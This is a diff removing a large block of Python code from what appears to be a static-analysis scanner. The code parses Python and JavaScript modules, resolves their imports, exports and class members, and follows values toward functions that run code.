-                if end < 0:
-                    parts.append(" " * (n - j))
-                    delim = three
-                    break
-                parts.append(" " * (end + 3 - j))
-                i = end + 3
-                continue
-            k = _XF_PY_BODY_RE[ch].match(row, j + 1).end()     # to the closing quote, a backslash escaping
-            if k < n and row[k] == ch:
-                parts.append(ch + " " * (k - j - 1) + ch)
-                i = k + 1
-            else:                                   # unterminated: to the end of the row
-                parts.append(ch + " " * (n - j - 1))
-                break
-        out.append("".join(parts))
-    return out
-
-
-def _xf_js_mask_line(row):
-    """`row` with each string literal's contents blanked (quotes kept); its length stays."""
-    return _DL_STR_RE.sub(lambda m: m.group()[0] + " " * (len(m.group()) - 2) + m.group()[-1]
-                          if len(m.group()) >= 2 else m.group(), row)
-
-
-def _xf_has_source(expr):
-    return next(_dl_finditer(_DL_SOURCE, expr), None) is not None
-
-
-def _xf_chains(expr):
-    """The member chains named in `expr` (a, a.b.c), spaces taken out."""
-    return {_XF_SPACE_RE.sub("", m.group()) for m in _DL_CHAIN_RE.finditer(expr)}
-
-
-class _XfLocals:
-    """{name: (source, refs)} of assignments [(name, rhs)], merged per name —
-    each read only when _xf_follow reaches it (most locals never are)."""
-
-    __slots__ = ("rhs", "done")
-
-    def __init__(self, local_rows):
-        self.rhs, self.done = {}, {}
-        for name, rhs in local_rows:
-            self.rhs.setdefault(name, []).append(rhs)
-
-    def __contains__(self, name):
-        return name in self.rhs
-
-    def __getitem__(self, name):
-        got = self.done.get(name)
-        if got is None:
-            source, refs = False, frozenset()
-            for rhs in self.rhs[name]:
-                source, refs = source or _xf_has_source(rhs), refs | _xf_chains(rhs)
-            got = self.done[name] = (source, refs)
-        return got
-
-
-_xf_locals = _XfLocals
-
-
-def _xf_follow(exprs, locals_):
-    """(source, refs) of expressions, the local names they use followed to
-    what those are assigned (_XF_LOCAL_DEPTH deep)."""
-    source, refs = False, set()
-    for expr in exprs:
-        source = source or _xf_has_source(expr)
-        refs |= _xf_chains(expr)
-    frontier = {c.split(".")[0] for c in refs}
-    seen = set(frontier)
-    for _ in range(_XF_LOCAL_DEPTH):
-        nxt = set()
-        for name in frontier:
-            if name in locals_:
-                s, r = locals_[name]
-                source = source or s
-                refs |= r
-                nxt |= {c.split(".")[0] for c in r} - seen
-        seen |= nxt
-        frontier = nxt
-        if not frontier:
-            break
-    return source, frozenset(refs)
-
-
-def _xf_delivers(body, params):
-    """Does a body that receives a value hand it to a callback: a parameter
-    it calls, or a Promise's resolve (https.get(u, (r) => … cb(data)))?"""
-    joined = "\n".join(body)
-    if not any(n in joined for n in _DL_NEEDLES):
-        return False
-    if not any(any(n in row for n in _DL_NEEDLES) and _xf_has_source(row) for row in body):
-        return False
-    names = set(params)
-    for row in body:
-        if "Promise" in row:
-            names.update(m.group("name") for m in _XF_PROMISE_RE.finditer(row))
-    names -= _XF_NOT_PARAMS
-    return bool(names) and any(m.group("name") in names for row in body for m in _XF_CALL_NAME_RE.finditer(row))
-
-
-def _xf_ret(returns, local_rows, body=(), params=()):
-    """(source, refs) of a body: its return expressions, and the local names
-    they use followed to what those are assigned; a body that hands what it
-    receives to a callback holds a received value too (_xf_delivers)."""
-    source, refs = _xf_follow(returns, _xf_locals(local_rows))
-    if not source and body and _xf_delivers(body, params):
-        source = True
-    return source, refs
-
-
-def _xf_params(row, at):
-    """The parameter names of the function whose header starts at column
-    `at` of `row`: its first (…) there, or an arrow's single name."""
-    one = _XF_ARROW_ONE_RE.match(row, at)
-    if one is not None:
-        return [one.group("name")]
-    i = row.find("(", at)
-    m = _XF_PARAMS_RE.match(row, i) if i >= 0 else None
-    if m is None:
-        return []
-    out = []
-    for item in m.group("params").split(","):
-        p = _XF_PARAM_NAME_RE.match(item)
-        if p is not None:
-            out.append(p.group("name"))
-    return out
-
-
-class _XfModule:
-    """What the follower reads of one module (see the section comment)."""
-
-    __slots__ = ("key", "lang", "path", "text", "defs", "classes", "imports", "exports", "reexports", "stars",
-                 "default", "default_module", "env", "bodies")
-
-    def __init__(self, key, lang, path, text):
-        self.key, self.lang, self.path, self.text = key, lang, path, text
-        self.defs = {}            # name -> (source, refs): functions and values
-        self.classes = {}         # class or object literal -> {member: ((source, refs), static)}
-        self.imports = {}         # local name -> (module key|None, imported name|None, kind, label)
-        self.exports = {}         # npm: exported name -> local name, or ("ref", chain)
-        self.reexports = {}       # npm: exported name -> (module key|None, name)
-        self.stars = []           # npm: module keys of `export * from`
-        self.default = None       # npm: the default export's local name, or "<default>"
-        self.default_module = None   # npm: module.exports = require(…)'s module key
-        self.env = {}             # environment variable -> (source, refs) of what it is set to
-        self.bodies = {}          # symbol -> (parameters, body rows) of a function that names a code runner
-
-
-def _xf_merge(old, new):
-    return (old[0] or new[0], old[1] | new[1])
-
-
-def _xf_member(mod, cls, name, ret, static):
-    """Add (or merge into) member `name` of class or object literal `cls`."""
-    meths = mod.classes.setdefault(cls, {})
-    if name in meths:
-        old, was_static = meths[name]
-        meths[name] = (_xf_merge(old, ret), was_static)
-    else:
-        meths[name] = (ret, static)
-
-
-def _xf_body(mod, sym, params, body):
-    """Keep a function's body for the runner test when it names a code runner."""
-    if params and sym not in mod.bodies:
-        joined = "\n".join(body)
-        if any(n in joined for n in _DL_RUN_NEEDLES):
-            mod.bodies[sym] = (params, body)
-
-
-def _xf_writes(mod, masked, row_cls, lang):
-    """Read the writes into a member of a module-level name (CACHE['c'] = …,
-    cache.code = …, an object literal's api.x = …) and of an instance
-    (self.data = … / this.data = … in a class's body) like assignments of
-    it: what they assign, the file's assignments followed (_xf_follow)."""
-    found = []
-    for k, row in enumerate(masked):
-        if "=" not in row or ("." not in row and "[" not in row) or len(row) > _DL_LONG_ROW:
-            continue                                    # (a member write names a member: `.x` or `[…]`)
-        for m in _XF_MEMBER_WRITE_RE.finditer(row):
-            name, attr = m.group("name"), m.group("attr")
-            if name in ("self", "this", "cls"):
-                if attr is None or row_cls[k] is None:
-                    continue
-                found.append((("member", row_cls[k], attr), m.group("rhs")))
-            elif attr is not None and name in mod.classes:
-                found.append((("member", name, attr), m.group("rhs")))
-            elif name in mod.defs:
-                found.append((("def", name), m.group("rhs")))
-    if not found:
-        return
-    pairs = []
-    for row in masked:
-        if "=" not in row or len(row) > _DL_LONG_ROW:
-            continue
-        if lang == "py":
-            a = _XF_ASSIGN_RE.match(row)
-            if a is not None:
-                pairs.append((a.group("name"), a.group("rhs")))
-        else:
-            pairs.extend((m.group("name"), m.group("rhs")) for m in _XF_JS_LOCAL_RE.finditer(row))
-    locals_ = _xf_locals(pairs)
-    for target, rhs in found:
-        ret = _xf_follow([rhs], locals_)
-        if target[0] == "member":
-            _xf_member(mod, target[1], target[2], ret, target[1] not in mod.defs and _xf_is_object(mod, target[1]))
-        else:
-            mod.defs[target[1]] = _xf_merge(mod.defs[target[1]], ret)
-
-
-def _xf_is_object(mod, cls):
-    """Is `cls` an object literal (its members are all static)?"""
-    meths = mod.classes.get(cls, {})
-    return bool(meths) and all(static for _ret, static in meths.values())
-
-
-def _xf_py_parse(mod, pkg_parts):
-    """Fill `mod` from its Python text (see the section comment)."""
-    if len(mod.text) > _XF_MAX_CHARS:
-        return
-    code = mod.text
-    masked = _xf_py_mask(code)
-    n = len(masked)
-    row_cls = [None] * n
-    cls, cls_indent, body_indent, k = None, -1, -1, 0
-    while k < n:
-        row = masked[k]
-        stripped = row.strip()
-        if not stripped:
-            k += 1
-            continue
-        indent = len(row) - len(row.lstrip())
-        if cls is not None and indent <= cls_indent:
-            cls = None
-        if cls is not None and body_indent < 0:
-            body_indent = indent                        # the class body's own level
-        cm = _XF_CLASS_RE.match(row) if "class" in row else None
-        if cm is not None:
-            if indent == 0:
-                cls, cls_indent, body_indent = cm.group("name"), indent, -1
-                mod.classes.setdefault(cls, {})
-            k += 1
-            continue
-        d = _XF_DEF_RE.match(row) if "def" in row else None
-        if d is not None and (indent == 0 or (cls is not None and indent > cls_indent)):
-            j = k + 1
-            while j < n and j - k <= _XF_WINDOW:
-                r = masked[j]
-                if r.strip() and len(r) - len(r.lstrip()) <= indent:
-                    break
-                j += 1
-            inline = _XF_DEF_END_RE.search(row, d.end())          # def f(x): return x
-            body = ([row[inline.end():]] if inline is not None and row[inline.end():].strip() else []) + masked[k + 1:j]
-            params = _xf_params(row, d.end() - 1)
-            returns = [m.group("expr") for m in (_XF_RETURN_RE.match(r) for r in body if "return" in r) if m is not None]
-            locals_ = [(a.group("name"), a.group("rhs")) for a in (_XF_ASSIGN_RE.match(r) for r in body if "=" in r)
-                       if a is not None]
-            ret = _xf_ret(returns, locals_, body, params)
-            name = d.group("name")
-            if cls is None:
-                mod.defs.setdefault(name, ret)
-                _xf_body(mod, name, params, body)
-            else:
-                static = k > 0 and _XF_STATIC_RE.match(masked[k - 1]) is not None
-                _xf_member(mod, cls, name, ret, static)
-                _xf_body(mod, cls + "." + name, params, body)
-                for t in range(k, j):
-                    row_cls[t] = cls
-            k = j
-            continue
-        a = (_XF_ASSIGN_RE.match(row) if "=" in row and (indent == 0 or (cls is not None and indent == body_indent))
-             else None)
-        if a is not None and len(a.group("rhs")) <= _DL_LONG_ROW:
-            ret = (_xf_has_source(a.group("rhs")), frozenset(_xf_chains(a.group("rhs"))))
-            if indent == 0:
-                mod.defs.setdefault(a.group("name"), ret)
-            elif cls is not None and indent == body_indent:   # a class attribute: data = requests.get(…).text
-                _xf_member(mod, cls, a.group("name"), ret, True)
-        k += 1
-    joined = "\n".join(masked)
-    for m in _XF_FROM_RE.finditer(joined):
-        target = _xf_resolve(m.group("mod"), pkg_parts)
-        names = m.group("names").strip()
-        if names == "*":
-            mod.imports.setdefault("*" + (target or ""), (target, "*", "star", target))
-            continue
-        for item in names.strip("()").split(","):
-            parts = item.split()
-            if not parts:
-                continue
-            local = parts[2] if len(parts) == 3 and parts[1] == "as" else parts[0]
-            mod.imports[local] = (target, parts[0], "name", target)
-    for m in _XF_IMPORT_RE.finditer(joined):
-        for item in m.group("names").split(","):
-            parts = item.split()
-            if not parts:
-                continue
-            local = parts[2] if len(parts) == 3 and parts[1] == "as" else parts[0]
-            mod.imports[local] = (parts[0], None, "module", parts[0])
-    code_rows = code.split("\n")
-    if "import_module" in code or "__import__" in code:
-        for k, row in enumerate(code_rows):
-            if "import" not in row or len(row) > _DL_LONG_ROW:
-                continue
-            for m in _XF_PY_DYN_IMPORT_RE.finditer(row):
-                if masked[k][m.start():m.start() + 1] != row[m.start()]:
-                    continue                            # in a comment or a docstring
-                target = _xf_resolve(m.group("mod"), pkg_parts)
-                if target is None:
-                    continue
-                local = m.group("local")
-                parts = target.split(".")
-                if m.group("fn") == "__import__" and "fromlist" not in m.group("rest") and len(parts) > 1:
-                    # __import__('a.b') is the top package a; a.b is a member of it
-                    mod.imports[local] = (parts[0], None, "module", parts[0])
-                    for i in range(2, len(parts) + 1):
-                        sub = ".".join(parts[:i])
-                        mod.imports[local + sub[len(parts[0]):]] = (sub, None, "module", sub)
-                else:
-                    mod.imports[local] = (target, None, "module", target)
-    for k, row in enumerate(code_rows):
-        if "environ" not in row or len(row) > _DL_LONG_ROW:
-            continue
-        for m in _XF_PY_ENV_WRITE_RE.finditer(row):
-            if masked[k][m.start():m.start() + 1] != row[m.start()]:
-                continue                                # in a comment or a docstring
-            rhs = masked[k][m.start("rhs"):m.end("rhs")]
-            old = mod.env.get(m.group("var"), (False, frozenset()))
-            mod.env[m.group("var")] = (old[0] or _xf_has_source(rhs), old[1] | _xf_chains(rhs))
-    _xf_writes(mod, masked, row_cls, "py")
-
-
-def _xf_js_body(masked, k, at):
-    """(rows, end): the rows of the brace body that starts at the first '{'
-    at or after column `at` of row k, up to its closing '}' (or
-    _XF_WINDOW rows), the first cut at that '{'; ([], k) when there is none."""
-    first = masked[k].find("{", at)
-    if first < 0:
-        return [], k
-    rows, depth = [], 0
-    for j in range(k, min(len(masked), k + _XF_WINDOW + 1)):
-        row = masked[j][first:] if j == k else masked[j]
-        cut = None
-        for b in _XF_BRACE_RE.finditer(row):
-            depth += 1 if b.group() == "{" else -1
-            if depth == 0:
-                cut = b.end()
-                break
-        rows.append(row if cut is None else row[:cut])
-        if cut is not None:
-            return rows, j
-    return rows, min(len(masked), k + _XF_WINDOW + 1) - 1
-
-
-def _xf_js_ret(rows, params=()):
-    returns = [m.group("expr") for row in rows for m in _XF_JS_RETURN_RE.finditer(row)]
-    locals_ = [(m.group("name"), m.group("rhs")) for row in rows for m in _XF_JS_LOCAL_RE.finditer(row)]
-    return _xf_ret(returns, locals_, rows, params)
-
-
-def _xf_js_fn(masked, k, at):
-    """((source, refs), params, body rows) of the function whose header
-    starts at column `at` of row k: its brace body, or an arrow's expression."""
-    row = masked[k]
-    params = _xf_params(row, at)
-    arrow = row.find("=>", at)
-    brace = row.find("{", at)
-    if arrow >= 0 and (brace < 0 or arrow < brace):
-        rest = row[arrow + 2:].lstrip()
-        if not rest.startswith("{"):
-            return _xf_ret([rest], [], [rest], params), params, [rest]
-        body, _end = _xf_js_body(masked, k, arrow)
-        return _xf_js_ret(body, params), params, body
-    body, _end = _xf_js_body(masked, k, at)
-    return _xf_js_ret(body, params), params, body
-
-
-def _xf_js_destr(names):
-    """[(export/property name, local name)] for a `{ a, b as c, d: e, 'f': g }` list."""
-    out = []
-    for item in names.split(","):
-        parts = [p.strip("'\"`") for p in item.replace(":", " ").replace(" as ", " ").split()]
-        parts = [p for p in parts if p]
-        if len(parts) == 1:
-            out.append((parts[0], parts[0]))
-        elif len(parts) >= 2:
-            out.append((parts[0], parts[1]))
-    return out
-
-
-def _xf_js_row_classes(rows):
-    """For each masked row, the name of the class whose body encloses it (or
-    None), and how deep in that body the row starts (1: the class body's own
-    level) — a brace-depth pass pairing `class NAME … {` with its `}`."""
-    row_class, row_level = [None] * len(rows), [0] * len(rows)
-    depth, stack, pending = 0, [], None         # stack entries: (class name, body depth)
-    for k, row in enumerate(rows):
-        if stack:
-            row_class[k], row_level[k] = stack[-1][0], depth - stack[-1][1]
-        if "{" not in row and "}" not in row and "class" not in row:
-            continue
-        events = [(m.start(), "c", m.group("name")) for m in _XF_JS_CLASS_RE.finditer(row)]
-        events += [(m.start(), m.group(), None) for m in _XF_BRACE_RE.finditer(row)]
-        events.sort()
-        for _pos, kind, name in events:
-            if kind == "c":
-                pending = name
-            elif kind == "{":
-                if pending is not None:
-                    stack.append((pending, depth))
-                    pending = None
-                depth += 1
-            else:
-                depth -= 1
-                if stack and stack[-1][1] == depth:
-                    stack.pop()
-    return row_class, row_level
-
-
-def _xf_js_key(rel, spec):
-    """The module key a relative import `spec` of the file `rel` names, else
-    None (a bare name is another package); '.' and '..' name an index."""
-    if not spec.startswith("."):
-        return None
-    key = _xf_js_norm(posixpath.normpath(posixpath.join(posixpath.dirname(rel), spec)))
-    return "index" if key == "." else key
-
-
-def _xf_js_views(text):
-    """(code rows, masked rows) of a JavaScript text: comments blanked, and
-    in the masked rows string contents too; rows keep their length, and a
-    row longer than _DL_LONG_ROW (minified code) is not read (blank)."""
-    code, masked, in_block = [], [], False
-    for row in text.split("\n"):
-        if len(row) > _DL_LONG_ROW:
-            code.append("")
-            masked.append("")
-            continue
-        m = _xf_js_mask_line(row) if ("'" in row or '"' in row or "`" in row) else row
-        if not in_block and "/" not in m:                  # (no comment starts on it)
-            code.append(row)
-            masked.append(m)
-            continue
-        spans, i = [], 0
-        while i <= len(m):
-            if in_block:
-                e = m.find("*/", i)
-                if e < 0:
-                    spans.append((i, len(m)))
-                    break
-                spans.append((i, e + 2))
-                i, in_block = e + 2, False
-                continue
-            a = m.find("/*", i)
-            lc = _XF_JS_LINE_COMMENT_RE.search(m, i)
-            if lc is not None and (a < 0 or lc.start() < a):
-                spans.append((lc.start(), len(m)))
-                break
-            if a < 0:
-                break
-            e = m.find("*/", a + 2)
-            if e < 0:
-                spans.append((a, len(m)))
-                in_block = True
-                break
-            spans.append((a, e + 2))
-            i = e + 2
-        for a, b in spans:
-            m = m[:a] + " " * (b - a) + m[b:]
-            row = row[:a] + " " * (b - a) + row[b:]
-        code.append(row)
-        masked.append(m)
-    return code, masked
-
-
-def _xf_js_dirname_specs(code):
-    """`code` with each path built from the module's own directory
-    (path.join(__dirname, 'x'), __dirname + '/x', `${__dirname}/x`) written
-    as the relative specifier it is, './x', padded to the length it replaces."""
-    def spec(m):
-        rel = m.group("a") if m.group("a") is not None else (m.group("b") or m.group("c"))[1:]
-        while rel.startswith("./"):
-            rel = rel[2:]
-        new = "'./" + rel.lstrip("/") + "'"
-        return new.ljust(len(m.group())) if len(new) <= len(m.group()) else m.group()
-    return _XF_JS_DIRNAME_RE.sub(spec, code)
-
-
-def _xf_js_object(mod, rows, masked, k, at, cls):
-    """Read the object literal whose '{' is at column `at` of row k as `cls`,
-    its members static (see the section comment); the number of members."""
-    count, depth, expect = 0, 0, False
-    for j in range(k, min(len(masked), k + _XF_OBJECT_ROWS)):
-        row, code_row = masked[j], rows[j]
-        i = at if j == k else 0
-        n = len(row)
-        while i < n:
-            ch = row[i]
-            if expect and depth == 1 and ch != " " and ch != "\t":
-                expect = False
-                m = _XF_JS_MEMBER_RE.match(code_row, i)
-                if m is not None:
-                    name = m.group("name")
-                    if m.group("method") is not None:
-                        ret, params, body = _xf_js_fn(masked, j, m.start("name"))
-                        _xf_body(mod, cls + "." + name, params, body)
-                    elif m.group("colon") is not None:
-                        value = row[m.end():]
-                        if _XF_JS_FN_VALUE_RE.match(value.lstrip()):
-                            ret, params, body = _xf_js_fn(masked, j, m.end())
-                            _xf_body(mod, cls + "." + name, params, body)
-                        else:
-                            expr = value.split(",")[0]
-                            ret = (_xf_has_source(expr), frozenset(_xf_chains(expr)))
-                    else:
-                        ret = (False, frozenset({name}))             # { pull }: the name it holds
-                    _xf_member(mod, cls, name, ret, True)
-                    count += 1
-            if ch in "{([":
-                depth += 1
-                if depth == 1:
-                    expect = True
-            elif ch in "})]":
-                depth -= 1
-                if depth <= 0:
-                    return count
-            elif ch == "," and depth == 1:
-                expect = True
-            i += 1
-    return count
-
-
-def _xf_js_parse(mod, rel):
-    """Fill `mod` from its JavaScript text (see the section comment)."""
-    if len(mod.text) > _XF_MAX_CHARS:
-        return
-    rows, masked = _xf_js_views(mod.text)
-    code = "\n".join(rows)
-    if "__dirname" in code:
-        code = _xf_js_dirname_specs(code)
-    row_class, row_level = _xf_js_row_classes(masked)
-    objects = {}                                # row -> the const an object literal there is read as
-    for k, row in enumerate(masked):
-        if "{" not in row or row_class[k] is not None or not any(w in row for w in _XF_JS_OBJECT_WORDS):
-            continue
-        for m in _XF_JS_OBJECT_RE.finditer(row):
-            name = m.group("name")
-            cls = name if name is not None else "<exports>" if "module" in m.group() else "<default>"
-            if _xf_js_object(mod, rows, masked, k, m.end() - 1, cls) and name is not None:
-                objects[k] = name
-    # (each pattern is tried only where the words it needs are: litellm's and
-    # webpack's thousands of files are read in a few seconds)
-    for k, row in enumerate(masked):
-        cls = row_class[k]
-        for m in (_XF_JS_FUNC_RE.finditer(row) if "function" in row else ()):
-            if m.group("name") not in mod.defs:
-                ret, params, body = _xf_js_fn(masked, k, m.start())
-                mod.defs[m.group("name")] = ret
-                _xf_body(mod, m.group("name"), params, body)
-        if cls is not None:
-            for m in (_XF_JS_METHOD_RE.finditer(row) if "{" in row and ")" in row else ()):
-                name = m.group("name")
-                if name in _XF_JS_KEYWORDS:
-                    continue
-                ret, params, body = _xf_js_fn(masked, k, m.start("name"))
-                _xf_member(mod, cls, name, ret, m.group("static") is not None)
-                _xf_body(mod, cls + "." + name, params, body)
-            if row_level[k] == 1 and "=" in row:
-                f = _XF_JS_FIELD_RE.match(row)
-                if f is not None and f.group("name") not in _XF_JS_KEYWORDS and len(f.group("rhs")) <= _DL_LONG_ROW:
-                    rhs, name = f.group("rhs"), f.group("name")
-                    if _XF_JS_FN_VALUE_RE.match(rhs.lstrip()):              # pull = async () => { … }
-                        ret, params, body = _xf_js_fn(masked, k, f.start("rhs"))
-                        _xf_body(mod, cls + "." + name, params, body)
-                    else:
-                        ret = (_xf_has_source(rhs), frozenset(_xf_chains(rhs)))
-                    _xf_member(mod, cls, name, ret, f.group("static") is not None)
-            continue
-        cm = _XF_JS_CLASS_RE.search(row) if "class" in row else None
-        if cm is not None:
-            mod.classes.setdefault(cm.group("name"), {})
-        m = _XF_JS_CONST_RE.search(row) if "=" in row and ("const" in row or "let" in row or "var" in row) else None
-        if m is not None and len(m.group("rhs")) <= _DL_LONG_ROW and objects.get(k) != m.group("name"):
-            rhs = m.group("rhs")
-            if _XF_JS_FN_VALUE_RE.match(rhs.lstrip()):
-                ret, params, body = _xf_js_fn(masked, k, m.start("rhs"))
-                mod.defs.setdefault(m.group("name"), ret)
-                _xf_body(mod, m.group("name"), params, body)
-            else:
-                mod.defs.setdefault(m.group("name"), (_xf_has_source(rhs), frozenset(_xf_chains(rhs))))
-    esm = any(w in code for w in ("export ", "export\t", "export{", "export*"))
-    none = ()
-    for m in (_XF_JS_EXPORT_DECL_RE.finditer(code) if esm else none):
-        mod.exports[m.group("name")] = m.group("name")
-    for m in (_XF_JS_EXPORT_DEFAULT_DECL_RE.finditer(code) if esm and "default" in code else none):
-        name = m.group("fn") or m.group("cls")
-        if name:
-            mod.default = name
-        elif "function" in m.group(0):
-            k = code.count("\n", 0, m.start())
-            ret, params, body = _xf_js_fn(masked, k, m.start() - (code.rfind("\n", 0, m.start()) + 1))
-            mod.defs["<default>"] = ret
-            _xf_body(mod, "<default>", params, body)
-            mod.default = "<default>"
-    for m in (_XF_JS_EXPORT_DEFAULT_RE.finditer(code) if esm and "default" in code else none):
-        mod.default = m.group("name")
-    if "<default>" in mod.classes and mod.default is None:
-        mod.default = "<default>"                   # export default { … }
-    for m in (_XF_JS_EXPORT_LIST_RE.finditer(code) if esm else none):
-        for local, exported in _xf_js_destr(m.group("names")):
-            mod.exports[exported] = local
-    for m in (_XF_JS_EXPORT_FROM_RE.finditer(code) if esm and "from" in code else none):
-        key = _xf_js_key(rel, m.group("mod"))
-        for name, exported in _xf_js_destr(m.group("names")):
-            mod.reexports[exported] = (key, name)
-    for m in (_XF_JS_EXPORT_STAR_RE.finditer(code) if esm and "from" in code else none):
-        key = _xf_js_key(rel, m.group("mod"))
-        if m.group("ns"):
-            mod.reexports[m.group("ns")] = (key, None)
-        elif key is not None:
-            mod.stars.append(key)
-    for name in mod.classes.get("<exports>", {}):
-        mod.exports.setdefault(name, ("ref", "<exports>." + name))
-    cjs = "module" in code
-    for m in (_XF_JS_MODEXP_OBJ_RE.finditer(code) if cjs else none):
-        for exported, local in _xf_js_destr(m.group("names")):
-            mod.exports[exported] = local
-    for m in (_XF_JS_MODEXP_PROP_RE.finditer(code) if "exports" in code else none):
-        name = m.group("name") or m.group("qname")
-        rhs = m.group("rhs").strip().rstrip(";").strip()
-        if rhs in ("void 0", "undefined"):
-            continue
-        if _DL_NAME_RE.fullmatch(rhs) is not None:
-            mod.exports[name] = rhs
-            continue
-        k = code.count("\n", 0, m.start("rhs"))
-        at = m.start("rhs") - (code.rfind("\n", 0, m.start("rhs")) + 1)
-        local = "exports." + name
-        if _XF_JS_FN_VALUE_RE.match(rhs):
-            ret, params, body = _xf_js_fn(masked, k, at)
-            mod.defs[local] = ret
-            _xf_body(mod, local, params, body)
-        else:
-            expr = masked[k][at:] if k < len(masked) else rhs
-            mod.defs[local] = (_xf_has_source(expr), frozenset(_xf_chains(expr)))
-        mod.exports[name] = local
-    for m in (_XF_JS_MODEXP_ALL_RE.finditer(code) if cjs else none):
-        mod.default = m.group("name")
-    for m in (_XF_JS_MODEXP_CLASS_RE.finditer(code) if cjs and "class" in code else none):
-        mod.default = m.group("name")
-    for m in (_XF_JS_MODEXP_REQ_RE.finditer(code) if cjs and "require(" in code else none):
-        mod.default_module = _xf_js_key(rel, m.group("mod"))
-    for m in (_XF_JS_MODEXP_FN_RE.finditer(code) if cjs else none):
-        k = code.count("\n", 0, m.end())
-        ret, params, body = _xf_js_fn(masked, k, m.end() - (code.rfind("\n", 0, m.end()) + 1))
-        mod.defs["<default>"] = ret
-        _xf_body(mod, "<default>", params, body)
-        mod.default = "<default>"
-    for m in (_XF_JS_DEFINE_RE.finditer(code) if "defineProperty" in code else none):
-        mod.exports.setdefault(m.group("name"), ("ref", _XF_SPACE_RE.sub("", m.group("ref"))))
-    req, dyn, imp = "require(" in code, "import(" in code, "import" in code and "from" in code
-    for rx in ((_XF_JS_REQ_DESTR_RE,) if req else ()) + ((_XF_JS_DYN_DESTR_RE,) if dyn else ()):
-        for m in rx.finditer(code):
-            key = _xf_js_key(rel, m.group("mod"))
-            for exp, local in _xf_js_destr(m.group("names")):
-                mod.imports[local] = (key, exp, "name", m.group("mod"))
-    for rx in ((_XF_JS_REQ_NS_RE,) if req else ()) + ((_XF_JS_DYN_NS_RE,) if dyn else ()):
-        for m in rx.finditer(code):
-            mod.imports[m.group("ns")] = (_xf_js_key(rel, m.group("mod")), None, "module", m.group("mod"))
-    for m in (_XF_JS_REQ_MEMBER_RE.finditer(code) if req else none):
-        mod.imports[m.group("local")] = (_xf_js_key(rel, m.group("mod")), m.group("name"), "name", m.group("mod"))
-    for m in (_XF_JS_IMP_NAMED_RE.finditer(code) if imp else none):
-        key = _xf_js_key(rel, m.group("mod"))
-        for exp, local in _xf_js_destr(m.group("names")):
-            mod.imports[local] = (key, exp, "name", m.group("mod"))
-    for m in (_XF_JS_IMP_NS_RE.finditer(code) if imp else none):
-        mod.imports[m.group("ns")] = (_xf_js_key(rel, m.group("mod")), None, "module", m.group("mod"))
-    for m in (_XF_JS_IMP_DEFAULT_RE.finditer(code) if imp else none):
-        mod.imports[m.group("name")] = (_xf_js_key(rel, m.group("mod")), "default", "default", m.group("mod"))
-    for k, row in enumerate(rows):
-        if "env" not in row:
-            continue
-        for m in _XF_JS_ENV_WRITE_RE.finditer(row):
-            var = m.group("a") or m.group("b")
-            rhs = masked[k][m.start("rhs"):m.end("rhs")]
-            old = mod.env.get(var, (False, frozenset()))
-            mod.env[var] = (old[0] or _xf_has_source(rhs), old[1] | _xf_chains(rhs))
-    _xf_writes(mod, masked, row_class, "js")
-
-
-class _XfPackage:
-    """One package's modules, what their names resolve to, and which symbols
-    hold a received value (see the section comment)."""
-
-    def __init__(self, mods):
-        self.mods = mods                          # key -> _XfModule
-        self.exported = {}                        # (key, name) -> resolve_export(key, name), from the top
-
-    def resolve_local(self, mod, name, depth=0):
-        """What `name` is in `mod`: ('sym', (key, name)), ('class', (key, cls)),
-        ('module', key), or None."""
-        if depth > _XF_MAX_DEPTH:
-            return None
-        if name in mod.defs:
-            return "sym", (mod.key, name)
-        if name in mod.classes:
-            return "class", (mod.key, name)
-        imp = mod.imports.get(name)
-        if imp is not None:
-            return self.resolve_import(imp, depth + 1)
-        return None
-
-    def resolve_import(self, imp, depth=0):
-        key, name, kind, _label = imp
-        if key is None:
-            return None
-        if key not in self.mods:                    # a namespace package: from . import mod
-            sub = f"{key}.{name}" if kind == "name" and name else None
-            return ("module", sub) if sub in self.mods else None
-        if kind == "module":
-            return "module", key
-        return self.resolve_export(key, name, depth + 1)
-
-    def export(self, key, name):
-        """resolve_export(key, name) from the top, remembered (the seeds of
-        every module of a package ask for the same exports)."""
-        got = self.exported.get((key, name), self)
-        if got is self:
-            got = self.exported[(key, name)] = self.resolve_export(key, name)
-        return got
-
-    def resolve_export(self, key, name, depth=0):
-        """What module `key` exports as `name` (see resolve_local)."""
-        mod = self.mods.get(key)
-        if mod is None or depth > _XF_MAX_DEPTH:
-            return None
-        if mod.lang == "py":
-            got = self.resolve_local(mod, name, depth + 1)
-            if got is not None:
-                return got
-            sub = key + "." + name
-            return ("module", sub) if sub in self.mods else None
-        if name == "default":
-            if mod.default is not None:
-                return self.resolve_local(mod, mod.default, depth + 1)
-            if mod.default_module is not None:
-                return ("module", mod.default_module) if mod.default_module in self.mods else None
-            # else exports.default = … (TypeScript's and Babel's output), read below
-        exp = mod.exports.get(name)
-        if isinstance(exp, tuple):
-            return self.resolve_chain(mod, exp[1], None, depth + 1)
-        if exp is not None:
-            return self.resolve_local(mod, exp, depth + 1)
-        re_ = mod.reexports.get(name)
-        if re_ is not None:
-            if re_[0] is None:
-                return None
-            return ("module", re_[0]) if re_[1] is None else self.resolve_export(re_[0], re_[1], depth + 1)
-        for star in mod.stars + ([mod.default_module] if mod.default_module else []):
-            got = self.resolve_export(star, name, depth + 1)
-            if got is not None:
-                return got
-        if mod.default is not None and name != "default":   # module.exports = api: api's members
-            return self.resolve_chain(mod, mod.default + "." + name, None, depth + 1)
-        return None
-
-    def resolve_chain(self, mod, chain, cls, depth=0):
-        """What the member chain `chain` names in `mod` (inside class `cls`:
-        self.x / this.x is the class's own member)."""
-        parts = chain.split(".")
-        if cls is not None and parts[0] in ("self", "this", "cls") and len(parts) >= 2:
-            if parts[1] in mod.classes.get(cls, {}):
-                return "sym", (mod.key, cls + "." + parts[1])
-            return None
-        got, used = None, 0
-        for i in range(len(parts), 0, -1):          # a dotted import (pkg._net) is one name
-            head = ".".join(parts[:i])
-            if head in mod.imports or (i == 1 and (head in mod.defs or head in mod.classes)):
-                got, used = self.resolve_local(mod, head, depth + 1), i
-                break
-        rest = parts[used:]
-        while got is not None and rest:
-            kind, val = got
-            if kind == "module":
-                got = self.resolve_export(val, rest[0], depth + 1)
-            elif kind == "class":
-                meths = self.mods[val[0]].classes.get(val[1], {})
-                got = ("sym", (val[0], val[1] + "." + rest[0])) if rest[0] in meths else None
-            else:
-                return got
-            rest = rest[1:]
-        return got
-
-    def symbols(self):
-        """{(key, name): (mod, source, refs, cls)} of every function, value,
-        member and environment variable write, at most _XF_MAX_SYMBOLS."""
-        out = {}
-        for mod in self.mods.values():
-            for name, (source, refs) in mod.defs.items():
